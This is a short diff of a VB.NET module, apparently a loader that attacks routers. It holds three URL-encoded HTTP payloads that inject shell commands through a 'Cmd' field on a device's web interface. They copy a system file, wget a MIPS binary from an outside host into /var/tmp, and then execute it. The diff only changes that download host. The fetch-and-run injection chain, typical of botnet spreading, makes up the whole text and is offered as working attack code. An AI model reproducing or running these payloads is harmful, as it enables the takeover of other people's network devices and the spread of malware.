@@ -4,7 +4,7 @@ Imports System.Threading
 
 Module Module1
     Dim payload As Byte() = Encoding.ASCII.GetBytes("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=cp+%2Fetc%2Finit.norm+%2Fvar%2Ftmp%2Fresp&CmdAck=")
-    Dim payload2 As Byte() = Encoding.ASCII.GetBytes("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=wget+http%3A%2F%2F0.0.0.0%2FMIPS+-O+%2Fvar%2Ftmp%2Fresp&CmdAck=")
+    Dim payload2 As Byte() = Encoding.ASCII.GetBytes("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=wget+http%3A%2F%2F192.168.0.1%2FMIPS+-O+%2Fvar%2Ftmp%2Fresp&CmdAck=")
     Dim payload3 As Byte() = Encoding.ASCII.GetBytes("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=%2Fvar%2Ftmp%2Fresp+ztev2&CmdAck=")
 
     Dim wg As New ManualResetEvent(False)
